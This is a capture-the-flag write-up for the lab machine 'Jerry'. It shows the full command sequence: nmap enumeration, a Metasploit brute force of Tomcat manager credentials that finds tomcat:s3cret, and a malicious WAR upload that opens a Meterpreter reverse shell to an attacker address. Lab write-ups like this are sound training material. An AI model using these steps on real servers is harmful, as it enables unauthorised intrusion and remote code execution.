# Jerry

---

## Setup

Spawned in the machine as always, got the IP and stored it in an environment variable in case I lose it -as always-

```shell
└─$ export IP=10.10.10.95
└─$ echo $IP
10.10.10.95
```

and to make sure everything is working alright and the target machine is up and running, we can use `ping` to make sure it's alive.

```shell
└─$ ping $IP
PING 10.10.10.95 (10.10.10.95) 56(84) bytes of data.
64 bytes from 10.10.10.95: icmp_seq=1 ttl=63 time=69.3 ms
64 bytes from 10.10.10.95: icmp_seq=2 ttl=63 time=68.1 ms
64 bytes from 10.10.10.95: icmp_seq=3 ttl=63 time=67.9 ms
64 bytes from 10.10.10.95: icmp_seq=4 ttl=63 time=70.4 ms
```

---

## Enumeration

First step after spawning in the target machine and connected to the VPN, I start an [`nmap`](https://nmap.org) scan to determine open ports and running services and may be vulnerable using the following flags:

`-sV`: Determine running services/versions on open ports
`-sC`: Run default scripts
`-p-`: Scan all possible ports
`-v`: Verbose output for more information about the scan
`-oN`: Write the output of the scan into a file

```shell
$ nmap -sV -sC -p- -v -oN scan.nmap $IP
```

the scan result:

```shell
Nmap scan report for 10.10.10.95
Host is up (0.079s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
```

---

## Tomcat Exploitation

I first navigated to `http://10.10.10.95:8080` to see the webpage and I was greeted with the default home page of a tomcat server, so I navigated to `/manager` and was prompted with a login form, I tried `admin:admin` and It logged me in but I still didn't have permissions to get to `/manager/html`, so I used Metasploit to bruteforce most known and common username and password combinations as follows:

```shell
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.10.10.95
rhosts => 10.10.10.95
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rport 8080
rport => 8080
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

it kept doing its magic until it hit `tomcat:s3cret`!

Then after reading online for some time I found that I can just use another Metasploit module to execute a poisoned `.war` file on the server and gain a reverse shell:

```shell
msf6 > use exploit/multi/http/tomcat_mgr_upload
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > set httppassword tomcat
httppassword => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
httpusername => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set httppassword s3cret
httppassword => s3cret
msf6 exploit(multi/http/tomcat_mgr_upload) > set rhosts 10.10.10.95
rhosts => 10.10.10.95
msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 8080
rport => 8080
msf6 exploit(multi/http/tomcat_mgr_upload) > set lhost 10.10.16.4
lhost => 10.10.16.4
msf6 exploit(multi/http/tomcat_mgr_upload) > run
```

And that's it, I got a session open and I navigated through the target machine to `C:\Administrator\Desktop` and both flags were for the price of one!

---

## Tomcat Exploitation Without Metasploit

<---- TODO ---->